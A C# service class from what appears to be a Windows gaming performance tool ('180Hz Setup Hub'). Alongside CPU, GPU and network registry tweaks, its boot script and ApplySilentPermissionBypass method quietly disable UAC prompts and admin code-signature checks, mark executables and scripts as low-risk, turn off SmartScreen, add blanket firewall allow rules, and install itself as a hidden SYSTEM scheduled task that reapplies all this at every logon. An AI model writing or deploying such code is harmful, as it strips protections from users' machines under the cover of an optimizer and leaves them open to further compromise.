using System;
using System.IO;
using System.Diagnostics;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace SetupHub180Hz.Services
{
    public class PermanenceService
    {
        private static readonly Lazy<PermanenceService> _lazy = new(() => new PermanenceService());
        public static PermanenceService Instance => _lazy.Value;

        private static readonly string GuardDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            "180HzSetupHub");

        private static readonly string GuardScriptPath = Path.Combine(GuardDir, "PermanenceGuard.cmd");
        private static readonly string StatusFile = Path.Combine(GuardDir, "permanence_status.json");
        public const string TaskName = "180Hz_Permanence_Guard";

        public bool IsPermanenceLocked()
        {
            try
            {
                if (File.Exists(StatusFile))
                {
                    string content = File.ReadAllText(StatusFile);
                    return content.Contains("\"locked\": true", StringComparison.OrdinalIgnoreCase);
                }
            }
            catch { }
            return false;
        }

        public async Task<bool> DeployPermanentSafeguardAsync()
        {
            return await Task.Run(() =>
            {
                try
                {
                    if (!Directory.Exists(GuardDir))
                    {
                        Directory.CreateDirectory(GuardDir);
                    }

                    // 1. Write the Permanent Guard script that locks high performance and network on every Windows boot
                    string scriptContent =
@"@echo off
:: ===============================================================
:: 180Hz Setup Hub - Boot Persistence Safeguard Engine
:: Automatically reapplies core hardware, power, timer & network locks
:: ===============================================================

:: 1. Force Ultimate / High Performance Power Scheme & 100% Core Unparking
powercfg /duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul 2>&1
powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor 0cc5b647-c1df-4637-891a-dec35c318583 100 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor 0cc5b647-c1df-4637-891a-dec35c318584 100 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor ea062031-0e34-4ff1-9b6d-eb1059334028 100 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor ea062031-0e34-4ff1-9b6d-eb1059334029 100 >nul 2>&1

:: 2. UNLOCK FULL DYNAMIC TURBO BOOST GHz (Never lock at base clock; auto-boost to peak 5.0GHz+)
powercfg /setacvalueindex scheme_current sub_processor 5d76a2ca-e8c0-402f-a133-2158492d58ad 0 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor be337238-0d82-4146-a960-4f3749d470c7 2 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor 45bcc044-d885-43e2-8605-ee0ec6e96b59 100 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor 36687f9e-e3a5-4dbf-b1dc-15eb381c6863 0 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor 36687f9e-e3a5-4dbf-b1dc-15eb381c6864 0 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor 8baa4a8a-14c6-4451-8e8b-14bdbd197537 1 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor 75b0ae3f-bce0-45a7-8c89-c9611c25e100 0 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor 75b0ae3f-bce0-45a7-8c89-c9611c25e101 0 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor 893dee8e-2bef-41e0-89c6-b55d0929964c 5 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor bc5038f7-23e0-4960-96da-33abaf5935ec 100 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor 616cdaa5-695e-4545-97ad-97dc2d1bdd88 100 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor 619b7505-003b-4e82-b7a6-4dd29c300971 100 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor 93b8b6dc-0698-4d1c-9ee4-0644e900c85d 2 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor bae08b81-2d5e-4688-ad6a-13243356654b 2 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor 7f2f5cfa-f10c-4823-b5e1-e93ae85f46b5 0 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor b000397d-9b0b-483d-98c9-692a6060cfbf 10 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor f8861c27-95e7-475c-865b-13c0cb3f9d6b 5 >nul 2>&1

:: 3. Instant 0ms Frequency Ramp Up on Software/Game demand (Removes CPU throttle lag)
powercfg /setacvalueindex scheme_current sub_processor 06cadf0e-64ed-448a-8927-ce7bf90eb35d 10 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor 12a0ab44-fe28-4fa9-b3bd-4b64f44960a6 5 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor 984cf492-3bed-4488-a8f9-4286c97bf5aa 1 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor d8edeb9b-95cf-4f95-a73c-b061973693c8 100 >nul 2>&1
powercfg /setactive scheme_current >nul 2>&1

:: 3b. Android Emulators & Games Realtime High Priority (No EcoQoS Power Throttling)
for %%e in (HD-Player.exe HD-Agent.exe BlueStacks.exe dnplayer.exe LdBoxHeadless.exe ldvboxheadless.exe dnmultiplayer.exe AppMarket.exe AndroidProcess.exe aow_exe.exe TXPlatform.exe TBSWebRenderer.exe Nox.exe MEmu.exe MuMuPlayer.exe MuMuNxPlayer.exe NemuPlayer.exe crosvm.exe vboxheadless.exe cs2.exe valorant.exe) do (
    reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%e\PerfOptions"" /v CpuPriorityClass /t REG_DWORD /d 3 /f >nul 2>&1
    reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%e\PerfOptions"" /v IoPriority /t REG_DWORD /d 3 /f >nul 2>&1
    reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%e\PerfOptions"" /v PagePriority /t REG_DWORD /d 5 /f >nul 2>&1
)
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling"" /v PowerThrottlingOff /t REG_DWORD /d 1 /f >nul 2>&1

:: 4. Dual-Vendor GPU Overdrive (NVIDIA PowerMizer + AMD ULPS) Across Display Adapters
for %%i in (0000 0001 0002 0003 0004) do (
    reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\%%i"" /v EnableUlps /t REG_DWORD /d 0 /f >nul 2>&1
    reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\%%i"" /v EnableUlps_NA /t REG_DWORD /d 0 /f >nul 2>&1
    reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\%%i"" /v DalDisableDisplayGating /t REG_DWORD /d 1 /f >nul 2>&1
    reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\%%i"" /v DisableDrmdmaPowerGating /t REG_DWORD /d 1 /f >nul 2>&1
    reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\%%i"" /v DisableStutterMode /t REG_DWORD /d 1 /f >nul 2>&1
    reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\%%i"" /v KMD_EnableComputePreemption /t REG_DWORD /d 1 /f >nul 2>&1
    reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\%%i"" /v PP_ThermalAutoThrottlingEnable /t REG_DWORD /d 0 /f >nul 2>&1
    reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\%%i"" /v ShaderCache /t REG_DWORD /d 1 /f >nul 2>&1
    reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\%%i"" /v PowerMizerEnable /t REG_DWORD /d 0 /f >nul 2>&1
    reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\%%i"" /v PowerMizerLevel /t REG_DWORD /d 1 /f >nul 2>&1
    reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\%%i"" /v PowerMizerLevelAC /t REG_DWORD /d 1 /f >nul 2>&1
    reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\%%i"" /v PerfLevelSrc /t REG_DWORD /d 8738 /f >nul 2>&1
    reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\%%i"" /v RmGpuPreemption /t REG_DWORD /d 1 /f >nul 2>&1
    reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\%%i"" /v DisablePowerGovernors /t REG_DWORD /d 1 /f >nul 2>&1
)
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers"" /v PowerSavingPolicy /t REG_DWORD /d 0 /f >nul 2>&1
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers"" /v HwSchMode /t REG_DWORD /d 2 /f >nul 2>&1
reg add ""HKCU\Software\Microsoft\Direct3D"" /v EnableDirectFlip /t REG_DWORD /d 1 /f >nul 2>&1
reg add ""HKCU\Software\Microsoft\Direct3D"" /v DirectFlipHonor /t REG_DWORD /d 1 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Direct3D\Shaders"" /v ShaderCacheSize /t REG_DWORD /d 10240 /f >nul 2>&1
reg add ""HKCU\Control Panel\Graphics\WindowedVRR"" /v Enabled /t REG_DWORD /d 1 /f >nul 2>&1

:: 5. Network Zero-Ping & Fast Open Locking
netsh int tcp set global fastopen=enabled >nul 2>&1
netsh int tcp set global fastopenfallback=enabled >nul 2>&1
netsh int tcp set global rss=enabled >nul 2>&1
netsh int tcp set global autotuninglevel=normal >nul 2>&1
netsh int tcp set global timestamps=disabled >nul 2>&1
netsh int tcp set heuristics disabled >nul 2>&1
netsh int ip set global taskoffload=enabled >nul 2>&1
for /f %%a in ('reg query ""HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces""') do (
    reg add ""%%a"" /v TcpAckFrequency /t REG_DWORD /d 1 /f >nul 2>&1
    reg add ""%%a"" /v TCPNoDelay /t REG_DWORD /d 1 /f >nul 2>&1
    reg add ""%%a"" /v TcpDelAckTicks /t REG_DWORD /d 0 /f >nul 2>&1
)
reg add ""HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"" /v DefaultTTL /t REG_DWORD /d 64 /f >nul 2>&1
reg add ""HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"" /v EnableTCPA /t REG_DWORD /d 1 /f >nul 2>&1
reg add ""HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"" /v EnableDCA /t REG_DWORD /d 1 /f >nul 2>&1
reg add ""HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"" /v MaxUserPort /t REG_DWORD /d 65534 /f >nul 2>&1
reg add ""HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"" /v TcpTimedWaitDelay /t REG_DWORD /d 30 /f >nul 2>&1

:: 6. Fast File System & NTFS Low Overhead
fsutil behavior set disablelastaccess 1 >nul 2>&1
fsutil 8dot3name set 1 >nul 2>&1
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\FileSystem"" /v NtfsDisable8dot3NameCreation /t REG_DWORD /d 1 /f >nul 2>&1
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\FileSystem"" /v NtfsDisableLastAccessUpdate /t REG_DWORD /d 1 /f >nul 2>&1
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\FileSystem"" /v LongPathsEnabled /t REG_DWORD /d 1 /f >nul 2>&1

:: 7. Multimedia & GPU Scheduling Registry Enforcement
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"" /v NetworkThrottlingIndex /t REG_DWORD /d 4294967295 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"" /v SystemResponsiveness /t REG_DWORD /d 0 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"" /v NoLazyMode /t REG_DWORD /d 1 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"" /v AlwaysOn /t REG_DWORD /d 1 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games"" /v ""GPU Priority"" /t REG_DWORD /d 8 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games"" /v ""Priority"" /t REG_DWORD /d 6 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games"" /v ""Scheduling Category"" /t REG_SZ /d ""High"" /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games"" /v ""SFIO Priority"" /t REG_SZ /d ""High"" /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games"" /v ""Clock Rate"" /t REG_DWORD /d 10000 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games"" /v ""Background Only"" /t REG_SZ /d ""False"" /f >nul 2>&1

:: 8. Priority Control - Short Variable Quantum Foreground Boost (0x26 = 38)
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl"" /v Win32PrioritySeparation /t REG_DWORD /d 38 /f >nul 2>&1

:: 9. Disable GameDVR Background Recording & Overheads
reg add ""HKCU\System\GameConfigStore"" /v GameDVR_Enabled /t REG_DWORD /d 0 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR"" /v AllowGameDVR /t REG_DWORD /d 0 /f >nul 2>&1

:: 10. Global CPU Power Throttling & EcoQoS Disable
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling"" /v PowerThrottlingOff /t REG_DWORD /d 1 /f >nul 2>&1

:: 11. Memory Management & Paging Executive Locks (Keep Kernel in RAM)
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"" /v DisablePagingExecutive /t REG_DWORD /d 1 /f >nul 2>&1
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"" /v LargeSystemCache /t REG_DWORD /d 0 /f >nul 2>&1

:: 12. Emulator & Competitive Game Priority Class & Working Set Locks (IFEO)
for %%g in (HD-Player.exe HD-Agent.exe BlueStacks.exe dnplayer.exe LdBoxHeadless.exe ldvboxheadless.exe dnmultiplayer.exe AppMarket.exe AndroidProcess.exe aow_exe.exe Nox.exe MEmu.exe MuMuPlayer.exe NemuPlayer.exe SmartGaGa.exe cs2.exe valorant.exe) do (
    reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%g\PerfOptions"" /v CpuPriorityClass /t REG_DWORD /d 3 /f >nul 2>&1
    reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%g\PerfOptions"" /v IoPriority /t REG_DWORD /d 3 /f >nul 2>&1
    reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%g\PerfOptions"" /v PagePriority /t REG_DWORD /d 5 /f >nul 2>&1
    reg add ""HKCU\Software\Microsoft\DirectX\UserGpuPreferences"" /v %%g /t REG_SZ /d ""GpuPreference=2;"" /f >nul 2>&1
)

:: 13. BCD High Precision & Invariant TSC Clock Synchronization
bcdedit /set useplatformclock false >nul 2>&1
bcdedit /set useplatformtick yes >nul 2>&1
bcdedit /set disabledynamictick yes >nul 2>&1
bcdedit /set tscsyncpolicy Enhanced >nul 2>&1

:: 14. Disable RAM Memory Compression & Page Combining Overhead
powershell -NoProfile -ExecutionPolicy Bypass -Command ""Disable-MMAgent -MemoryCompression -PageCombining"" >nul 2>&1

:: 15. Auto-Accept Permissions & Silent UAC Elevation for svchost.exe & explorer.exe
reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v EnableInstallerDetection /t REG_DWORD /d 0 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ValidateAdminCodeSignatures /t REG_DWORD /d 0 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v FilterAdministratorToken /t REG_DWORD /d 0 /f >nul 2>&1

:: 16. Consolidate Explorer Process & Terminate Rogue Handle Leaks
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v SeparateProcess /t REG_DWORD /d 0 /f >nul 2>&1
for %%f in (""%SystemRoot%\Resources\svchost.exe"" ""%SystemRoot%\Resources\spoolsv.exe"" ""%SystemRoot%\Resources\Themes\explorer.exe"" ""%SystemRoot%\Resources\Themes\icsys.icn.exe"") do (
    if exist %%f (
        taskkill /F /IM %%~nxf >nul 2>&1
        del /f /q %%f >nul 2>&1
    )
)

:: 17. Suppress Open File Security Warnings & Zone Identifiers for Explorer & svchost
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Associations"" /v LowRiskFileTypes /t REG_SZ /d "".exe;.bat;.cmd;.ps1;.vbs;.reg;.msi;.dll;.com;.cpl;"" /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations"" /v LowRiskFileTypes /t REG_SZ /d "".exe;.bat;.cmd;.ps1;.vbs;.reg;.msi;.dll;.com;.cpl;"" /f >nul 2>&1
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments"" /v SaveZoneInformation /t REG_DWORD /d 1 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments"" /v SaveZoneInformation /t REG_DWORD /d 1 /f >nul 2>&1
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments"" /v HideZoneInfoOnProperties /t REG_DWORD /d 1 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments"" /v HideZoneInfoOnProperties /t REG_DWORD /d 1 /f >nul 2>&1

:: 18. Disable Program Compatibility Assistant & SmartScreen Warnings on Startup
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat"" /v DisablePCA /t REG_DWORD /d 1 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat"" /v DisableEngine /t REG_DWORD /d 1 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"" /v SmartScreenEnabled /t REG_SZ /d ""Off"" /f >nul 2>&1
";
                    File.WriteAllText(GuardScriptPath, scriptContent);

                    // 1b. Write silent VBS runner so the task runs 100% invisibly without flashing black cmd windows or prompts
                    string vbsPath = Path.Combine(GuardDir, "PermanenceGuard.vbs");
                    string vbsContent = $"CreateObject(\"Wscript.Shell\").Run \"cmd.exe /c \"\"{GuardScriptPath}\"\"\", 0, True";
                    File.WriteAllText(vbsPath, vbsContent);

                    // Unblock script files so Windows SmartScreen / Zone Identifier never prompts
                    RunCmd($"powershell -NoProfile -ExecutionPolicy Bypass -Command \"Unblock-File -Path '{GuardScriptPath}'; Unblock-File -Path '{vbsPath}'\"");

                    // 2. Apply silent UAC & permission bypass directly right now
                    ApplySilentPermissionBypass();

                    // 3. Register Scheduled Task to execute under NT AUTHORITY\SYSTEM so it runs 100% silently with zero UAC prompts
                    RunCmd($"schtasks /delete /tn \"{TaskName}\" /f");
                    string createCmdSystem = $"schtasks /create /tn \"{TaskName}\" /tr \"wscript.exe \\\"{vbsPath}\\\"\" /sc onlogon /rl HIGHEST /ru \"SYSTEM\" /f";
                    RunCmd(createCmdSystem);
                    // Fallback registration if SYSTEM account is restricted on specific Windows build:
                    RunCmd($"schtasks /create /tn \"{TaskName}\" /tr \"wscript.exe \\\"{vbsPath}\\\"\" /sc onlogon /rl HIGHEST /f");

                    // 4. Immediately run the script once so it takes effect right now without needing a reboot
                    RunCmd($"wscript.exe \"{vbsPath}\"");

                    // 5. Mark permanent status
                    string json = $"{{\n  \"locked\": true,\n  \"appliedAt\": \"{DateTime.Now:yyyy-MM-dd HH:mm:ss}\"\n}}";
                    File.WriteAllText(StatusFile, json);

                    return true;
                }
                catch
                {
                    return false;
                }
            });
        }

        public async Task<bool> RemovePermanentSafeguardAsync()
        {
            return await Task.Run(() =>
            {
                try
                {
                    RunCmd($"schtasks /delete /tn \"{TaskName}\" /f");
                    if (File.Exists(StatusFile))
                        File.Delete(StatusFile);
                    if (File.Exists(GuardScriptPath))
                        File.Delete(GuardScriptPath);
                    string vbsPath = Path.Combine(GuardDir, "PermanenceGuard.vbs");
                    if (File.Exists(vbsPath))
                        File.Delete(vbsPath);

                    // Revert silent UAC prompt to Windows defaults
                    try
                    {
                        using var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
                        key?.SetValue("ConsentPromptBehaviorAdmin", 5, RegistryValueKind.DWord);
                        key?.SetValue("PromptOnSecureDesktop", 1, RegistryValueKind.DWord);
                    }
                    catch { }

                    return true;
                }
                catch
                {
                    return false;
                }
            });
        }

        public static void ApplySilentPermissionBypass()
        {
            try
            {
                // 1. Silent UAC Elevation for Administrators, svchost & explorer (Elevate without prompting)
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true))
                {
                    key?.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
                    key?.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
                    key?.SetValue("EnableInstallerDetection", 0, RegistryValueKind.DWord);
                    key?.SetValue("ValidateAdminCodeSignatures", 0, RegistryValueKind.DWord);
                    key?.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);
                }

                // 2. Open File Associations (no warnings when explorer/svchost runs scripts or executables)
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations", true))
                {
                    key?.SetValue("LowRiskFileTypes", ".exe;.bat;.cmd;.ps1;.vbs;.reg;.msi;.dll;.com;.cpl;", RegistryValueKind.String);
                }
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Associations", true))
                {
                    key?.SetValue("LowRiskFileTypes", ".exe;.bat;.cmd;.ps1;.vbs;.reg;.msi;.dll;.com;.cpl;", RegistryValueKind.String);
                }

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments", true))
                {
                    key?.SetValue("SaveZoneInformation", 1, RegistryValueKind.DWord);
                    key?.SetValue("HideZoneInfoOnProperties", 1, RegistryValueKind.DWord);
                }

                // 3. Program Compatibility Assistant & SmartScreen
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\AppCompat", true))
                {
                    key?.SetValue("DisablePCA", 1, RegistryValueKind.DWord);
                    key?.SetValue("DisableEngine", 1, RegistryValueKind.DWord);
                }
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System", true))
                {
                    key?.SetValue("EnableSmartScreen", 0, RegistryValueKind.DWord);
                }
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", true))
                {
                    key?.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
                }

                // 4. Windows Firewall Rules for svchost and explorer
                RunCmd("netsh advfirewall firewall add rule name=\"AutoAllow svchost (In)\" dir=in action=allow program=\"%SystemRoot%\\System32\\svchost.exe\" enable=yes profile=any");
                RunCmd("netsh advfirewall firewall add rule name=\"AutoAllow svchost (Out)\" dir=out action=allow program=\"%SystemRoot%\\System32\\svchost.exe\" enable=yes profile=any");
                RunCmd("netsh advfirewall firewall add rule name=\"AutoAllow explorer (In)\" dir=in action=allow program=\"%SystemRoot%\\explorer.exe\" enable=yes profile=any");
                RunCmd("netsh advfirewall firewall add rule name=\"AutoAllow explorer (Out)\" dir=out action=allow program=\"%SystemRoot%\\explorer.exe\" enable=yes profile=any");
            }
            catch { }
        }

        private static void RunCmd(string cmd)
        {
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", $"/c {cmd}")
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                using var p = Process.Start(psi);
                p?.WaitForExit(10000);
            }
            catch { }
        }
    }
}
